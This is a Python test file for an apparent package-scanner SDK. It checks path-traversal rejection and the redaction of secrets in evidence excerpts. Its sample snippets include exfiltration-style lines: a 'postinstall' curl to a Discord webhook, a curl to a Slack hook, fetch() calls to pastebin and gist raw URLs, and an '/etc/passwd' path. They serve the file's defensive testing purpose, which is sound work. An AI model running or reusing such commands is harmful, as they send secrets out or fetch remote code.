import pytest

from tallow_analyzer_sdk.evidence import (
    EvidenceValidationError,
    file_evidence,
    hash_evidence,
    metadata_evidence,
)
from tallow_analyzer_sdk.paths import PathValidationError, normalize_evidence_path


def test_reject_absolute_path():
    with pytest.raises(PathValidationError):
        normalize_evidence_path("/etc/passwd")


def test_reject_windows_absolute_path():
    with pytest.raises(PathValidationError):
        normalize_evidence_path("C:\\Users\\operator\\token.txt")


def test_reject_traversal():
    with pytest.raises(PathValidationError):
        normalize_evidence_path("../secret")


def test_normalize_windows_separators():
    assert normalize_evidence_path(".\\package\\file.js") == "package/file.js"


def test_file_evidence_supports_byte_ranges():
    evidence = file_evidence(
        "package/file.js",
        artifact_id="a",
        start_byte=4,
        end_byte=10,
    )
    assert evidence["start_byte"] == 4
    assert evidence["end_byte"] == 10


def test_line_range_validation():
    with pytest.raises(EvidenceValidationError):
        file_evidence("package.json", artifact_id="a", start_line=5, end_line=2)


def test_snippet_redaction_and_bound():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet='token="super-secret-value-here"',
    )
    assert evidence["excerpt_redacted"] is True
    assert len(evidence["excerpt"]) <= 240


def test_snippet_redacts_json_style_secret_values():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet='"token": "supersecretvalue"',
    )
    assert evidence["excerpt_redacted"] is True
    assert "supersecretvalue" not in evidence["excerpt"]


def test_snippet_redacts_delimited_json_style_secret_values():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet='"token": "123456789:SECRET"',
    )
    assert evidence["excerpt_redacted"] is True
    assert "123456789" not in evidence["excerpt"]
    assert "SECRET" not in evidence["excerpt"]


def test_snippet_redacts_unterminated_quoted_secret_values():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet='"token": "supersecretvalue-without-closing-quote',
    )
    assert evidence["excerpt_redacted"] is True
    assert "supersecretvalue" not in evidence["excerpt"]


def test_snippet_redacts_bearer_and_single_quoted_tokens():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet="authorization: Bearer abcdefghijklmnop; token='supersecretvalue'",
    )
    assert evidence["excerpt_redacted"] is True
    assert "abcdefghijklmnop" not in evidence["excerpt"]
    assert "supersecretvalue" not in evidence["excerpt"]


def test_snippet_redacts_standalone_known_token_shapes():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet=(
            "leaked ghp_abcdefghijklmnopqrstuvwxyz "
            "github_pat_1234567890abcdefghijklmnopqrstuvwxyz "
            "npm_abcdefghijklmnopqrstuv"
        ),
    )
    assert evidence["excerpt_redacted"] is True
    assert "ghp_abcdefghijklmnopqrstuvwxyz" not in evidence["excerpt"]
    assert "github_pat_" not in evidence["excerpt"]
    assert "npm_abcdefghijklmnopqrstuv" not in evidence["excerpt"]


def test_snippet_redacts_webhook_url_path_tokens():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet=(
            "postinstall=curl "
            "https://discord.com/api/webhooks/123456789012345678/secret-token?wait=true"
        ),
    )
    assert evidence["excerpt_redacted"] is True
    assert "123456789012345678" not in evidence["excerpt"]
    assert "secret-token" not in evidence["excerpt"]
    assert "wait=true" not in evidence["excerpt"]
    assert "https://discord.com/api/webhooks/<redacted>/<redacted>?<redacted>" in evidence[
        "excerpt"
    ]


def test_snippet_redacts_webhook_url_path_tokens_with_ports():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet="curl https://hooks.slack.com:443/services/T000000/B000000/SECRET",
    )
    assert evidence["excerpt_redacted"] is True
    assert "T000000" not in evidence["excerpt"]
    assert "B000000" not in evidence["excerpt"]
    assert "SECRET" not in evidence["excerpt"]
    assert "https://hooks.slack.com:443/services/<redacted>/<redacted>/<redacted>" in evidence[
        "excerpt"
    ]


def test_snippet_redacts_generic_exfil_url_path_tokens():
    evidence = file_evidence(
        "index.js",
        artifact_id="a",
        snippet=(
            "fetch('https://pastebin.com/raw/abcdef1234567890'); "
            "fetch('https://gist.githubusercontent.com/user/token/raw/file.js')"
        ),
    )
    assert evidence["excerpt_redacted"] is True
    assert "abcdef1234567890" not in evidence["excerpt"]
    assert "user/token/raw/file.js" not in evidence["excerpt"]
    assert "https://pastebin.com/raw/<redacted>" in evidence["excerpt"]
    redacted_gist = "https://gist.githubusercontent.com/<redacted>/<redacted>/<redacted>/<redacted>"
    assert redacted_gist in evidence["excerpt"]


def test_snippet_redacts_url_credentials():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet="curl https://user:password@pastebin.com/raw/abcdef1234567890?token=secret",
    )
    assert evidence["excerpt_redacted"] is True
    assert "user:password" not in evidence["excerpt"]
    assert "abcdef1234567890" not in evidence["excerpt"]
    assert "token=secret" not in evidence["excerpt"]
    assert "https://<redacted>@pastebin.com/raw/<redacted>?<redacted>" in evidence[
        "excerpt"
    ]


def test_snippet_redacts_url_fragments():
    evidence = file_evidence(
        "package.json",
        artifact_id="a",
        snippet="curl https://example.com/callback#abcdef1234567890",
    )
    assert evidence["excerpt_redacted"] is True
    assert "abcdef1234567890" not in evidence["excerpt"]
    assert "https://example.com/callback#<redacted>" in evidence["excerpt"]


def test_metadata_hashes_secret_like_values():
    evidence = metadata_evidence("npm_token", "super-secret-token-value", artifact_id="a")
    assert evidence["hash"] != "super-secret-token-value"
    assert evidence["excerpt_redacted"] is True


def test_hash_evidence():
    evidence = hash_evidence(
        "sha256",
        "abc",
        claimed="def",
        artifact_id="a",
        description="hash mismatch",
    )
    assert evidence["kind"] == "hash"
